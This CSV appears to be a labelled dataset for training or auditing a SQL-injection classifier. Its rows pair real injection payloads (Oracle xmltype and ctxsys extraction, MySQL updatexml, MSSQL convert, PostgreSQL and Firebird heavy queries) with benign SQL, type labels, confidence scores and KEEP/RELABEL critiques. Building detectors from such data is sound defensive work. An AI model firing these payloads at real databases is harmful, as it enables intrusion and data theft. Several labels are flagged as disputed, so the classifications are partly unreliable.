payload_norm,sqli_type,db_engine,confidence,reasoning,payload_inner,wrapper_detected,strip_depth,payload_delex_v2,verdict,critique_reasons
"select * from users WHERE username = ""-6353%\' ) ) and ( ( \'%\' = \'"" and username = ""-1889%\' ) ) ) and ( ( ( \'%\' = \'""",error_based,generic,0.85,wildcard pattern,-1889%\' ) ) ) and ( ( ( \'%\' = \',True,1,-__INT__ % \' ) ) ) and ( ( ( \' % \' = \',RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"1%"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""%"" = """,error_based,mysql,0.9,updatexml() for error extraction,"1%"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""%"" = """,False,0,"__INT__ % and updatexml ( __INT__ , concat ( __HEX__ , __HEX__ , ( select ( elt ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ ) , __INT__ ) and % __STR__",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
-8911%' or 9323 = 9323#,boolean_blind,generic,0.5,or_equality,-8911%' or 9323 = 9323#,False,0,-__INT__ % ' or __INT__ = __INT__#,RELABEL,reasoning too short (11 chars); confidence too low (0.50)
"select * from users WHERE username = ""1\'+ ( select \'pvej\' where 4496 = 4496 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) +\'"" and username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",boolean_blind,oracle,0.8,ctxsys.drithsx.sn for Oracle blind,1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,True,1,__INT__\' where __INT__ = __INT__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) --,KEEP,
SELECT bridge ( s ) FROM able SELECT thing ( s ),benign,mysql,0.9,not_sql_injection,SELECT bridge ( s ) FROM able SELECT thing ( s ),False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ ( __IDENT__ ),RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""-3100\' ) or# 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'etuj\' like \'etuj"" and username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885",error_based,oracle,0.95,Oracle XMLType from dual pattern,"select * from users WHERE username = ""-3100\' ) or# 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'etuj\' like \'etuj"" and username = ""-9295 ) ) ) and ( ( ( 8752 = 8752"" or username = ""-4582 ) ) as gvfo where 8885 = 8885",False,0,"select * from __IDENT__ where __IDENT__ = -__INT__\' ) or# __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) and ( \'__IDENT__\' like \'__IDENT__ and __IDENT__ = __STR__ or __IDENT__ = ""-__INT__ ) ) as __IDENT__ where __INT__ = __INT__",KEEP,
SELECT option_value FROM wp_options WHERE option_name = '_site_transient_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,benign,mysql,0.9,not_sql_injection,SELECT option_value FROM wp_options WHERE option_name = '_site_transient_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,False,0,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,RELABEL,reasoning too short (17 chars)
SELECT congress ( s ) FROM shirt INNER JOIN,benign,generic,1.0,Normal SELECT with function and INNER JOIN,SELECT congress ( s ) FROM shirt INNER JOIN,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__ inner join,KEEP,
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'kird' = 'kird",error_based,mysql,0.9,updatexml() for error extraction,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'kird' = 'kird",False,0,"__INT__ and updatexml ( __INT__ , concat ( __HEX__ , __HEX__ , ( select ( elt ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ ) , __INT__ ) and __IDENT__",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
"SELECT * FROM limited WHERE to NOT IN ( 'struck', 'long', 'machine' )",benign,generic,1.0,Normal SELECT with NOT IN clause,"SELECT * FROM limited WHERE to NOT IN ( 'struck', 'long', 'machine' )",False,0,"select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",KEEP,
select ( case when ( 8978 = 1426 ) then 1 else 8978* ( select 8978 from master..sysdatabases ) end ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,select ( case when ( 8978 = 1426 ) then 1 else 8978* ( select 8978 from master..sysdatabases ) end ) --,False,0,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__..sysdatabases ) end ) --,KEEP,
"select * from users WHERE username = ""1"" or username = ""-9505\' ) ) ) or username = ""1\' ) and username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",error_based,oracle,0.95,select from dual xmltype error,"-9505\' ) ) ) or username = ""1\' ) and username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",True,1,-__INT__\' ) ) ) or __IDENT__ = __STR__-__INT__\' where __INT__ = __INT__ and __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) --,KEEP,
SELECT COUNT ( dependID ) FROM relationship,benign,generic,1.0,Normal SQL SELECT COUNT column,SELECT COUNT ( dependID ) FROM relationship,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__,KEEP,
"-5529"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )",heavy_query,firebird,0.7,firebird_sysjoin,"-5529"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )",False,0,"-__INT__"" or __INT__ = ( __STR__ || ( select case __INT__ when __INT__ then __INT__ else __INT__ end from __IDENT__ ) || __STR__ )",RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4)
"select count ( * ) from generate_series ( 1,5000000 ) ) ||'",heavy_query,postgresql,0.7,generate_series,"select count ( * ) from generate_series ( 1,5000000 ) ) ||'",False,0,"select __IDENT__ ( * ) from __IDENT__ ( __INT__ , __INT__ ) ) || '",RELABEL,reasoning too short (15 chars)
SELECT * FROM stream,benign,mysql,0.9,not_sql_injection,SELECT * FROM stream,False,0,select * from __IDENT__,RELABEL,reasoning too short (17 chars)
atrazar,benign,generic,0.9,not_sql_injection,atrazar,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
SELECT * FROM environment WHERE Price NOT BETWEEN 10 AND 20,benign,generic,1.0,Normal SELECT with NOT BETWEEN,SELECT * FROM environment WHERE Price NOT BETWEEN 10 AND 20,False,0,select * from __IDENT__ where __IDENT__ not between __INT__ and __INT__,KEEP,
"select * from users WHERE username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1\' ) ) and ( ( \'ajka\' = \'ajka""",error_based,oracle,0.95,Oracle xmltype extraction,"1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1\' ) ) and ( ( \'ajka\' = \'ajka",True,1,"__INT__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- or __IDENT__ = ""__INT__\' ) ) and ( ( \'__IDENT__\' = \'__IDENT__",KEEP,
"select * from users WHERE username = ""-2783%\' ) ) and username = ""-2756\' where 6156 = 6156 and username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",error_based,oracle,0.95,xmltype for Oracle error extraction,"select * from users WHERE username = ""-2783%\' ) ) and username = ""-2756\' where 6156 = 6156 and username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",False,0,"select * from __IDENT__ where __IDENT__ = __STR__-__INT__\' where __INT__ = __INT__ and __IDENT__ = ""-__INT__\' ) or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual )",KEEP,
SELECT column_name FROM table_name WHERE condition LIMIT number ;,benign,mysql,0.9,not_sql_injection,SELECT column_name FROM table_name WHERE condition LIMIT number ;,False,0,select __IDENT__ from __IDENT__ where __IDENT__ limit __IDENT__ ;,RELABEL,reasoning too short (17 chars)
1.02549E+15,benign,generic,0.9,not_sql_injection,1.02549E+15,False,0,__INT__.02549e + __INT__,RELABEL,reasoning too short (17 chars)
09352334m,benign,generic,0.9,not_sql_injection,09352334m,False,0,09352334m,RELABEL,reasoning too short (17 chars)
"SELECT fallenID AS ID, certain AS stay FROM supply",benign,generic,1.0,Normal SELECT with column alias,"SELECT fallenID AS ID, certain AS stay FROM supply",False,0,"select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",KEEP,
"select * from users WHERE username = ""-9770\' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1\' ) where 1502 = 1502 or username = ""-4906\' ) ) ) and ( ( ( \'pkrq\' = \'pkrq""",boolean_blind,oracle,0.8,ctxsys.drithsx.sn for Oracle blind,"-9770\' ) ) as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",True,1,"-__INT__\' ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) --",KEEP,
"SELECT * FROM express ORDER BY whispered ASC, plain DESC",benign,mysql,0.9,not_sql_injection,"SELECT * FROM express ORDER BY whispered ASC, plain DESC",False,0,"select * from __IDENT__ order by __IDENT__ asc , __IDENT__ desc",RELABEL,reasoning too short (17 chars)
9.55315E+15,benign,generic,0.9,not_sql_injection,9.55315E+15,False,0,__INT__.55315e + __INT__,RELABEL,reasoning too short (17 chars)
select ( case when ( 5914 = 2314 ) then 5914 else 1/ ( select 0 ) end ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,select ( case when ( 5914 = 2314 ) then 5914 else 1/ ( select 0 ) end ) --,False,0,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ / ( select __INT__ ) end ) --,KEEP,
"select * from users WHERE username = ""-6353%\' ) ) or username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",error_based,oracle,0.95,xmltype for Oracle error extraction,"-6353%\' ) ) or username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",True,1,"-__INT__ % \' ) ) or __IDENT__ = ""-__INT__\' ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) --",KEEP,
"select * from users WHERE username = ""1\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'cbwx\' = \'cbwx"" and username = ""-7242\'",boolean_blind,oracle,0.8,ctxsys.drithsx.sn for Oracle blind,"select * from users WHERE username = ""1\' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'cbwx\' = \'cbwx"" and username = ""-7242\'",False,0,"select * from __IDENT__ where __IDENT__ = __INT__\' ) ) and __INT__ = ctxsys . __IDENT__.__IDENT__ ( __INT__ , ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) and ( ( \'__IDENT__\' = \'__IDENT__ and __IDENT__ = ""-__INT__\'",KEEP,
"1' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,"1' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,"__INT__' ) ) ) and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",KEEP,
con79lecimie91o,benign,generic,0.9,not_sql_injection,con79lecimie91o,False,0,__IDENT__,RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""1%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545",error_based,oracle,0.9,Oracle xmltype case-based,"select * from users WHERE username = ""1%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545",False,0,select * from __IDENT__ where __IDENT__ = __STR__-__INT__\' ) where __INT__ = __INT__ or -- __INT__ = ( select __IDENT__ ( xmltype ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) ) ) from dual ) -- __STR__1__STR__-__INT__ ) as __IDENT__ where __INT__ = __INT__,KEEP,
"SELECT immediatelyID AS ID, substance AS thin FROM harder",benign,generic,1.0,Normal SELECT with column alias,"SELECT immediatelyID AS ID, substance AS thin FROM harder",False,0,"select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",KEEP,
SELECT joy ( s ) FROM general UNION ALL,benign,mysql,0.9,not_sql_injection,SELECT joy ( s ) FROM general UNION ALL,False,0,select __IDENT__ ( __IDENT__ ) from __IDENT__ union all,RELABEL,reasoning too short (17 chars); benign payload contains 'union' (likely false negative)
SELECT * FROM central WHERE experience = 'movement',benign,mysql,0.9,not_sql_injection,movement,True,1,__IDENT__,RELABEL,reasoning too short (17 chars)
"select * from users WHERE username = ""-2028%\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'xpks\' like \'xpks""",error_based,mssql,0.85,convert int for MSSQL extraction,"-2028%\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( \'xpks\' like \'xpks",True,1,"-__INT__ % \' ) ) ) or __INT__ = convert ( __IDENT__ , ( select char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + ( select ( case when ( __INT__ = __INT__ ) then char ( __INT__ ) else char ( __INT__ ) end ) ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) + char ( __INT__ ) ) ) or __IDENT__ = ""__INT__\' ) ) ) and ( select __INT__ * ( if ( ( select * from ( select concat ( __HEX__ , ( select ( elt ( __INT__ = __INT__ , __INT__ ) ) ) , __HEX__ , __HEX__ ) ) __IDENT__ ) , __INT__ , __INT__ ) ) ) and ( ( ( \'__IDENT__\' like \'__IDENT__",RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4)
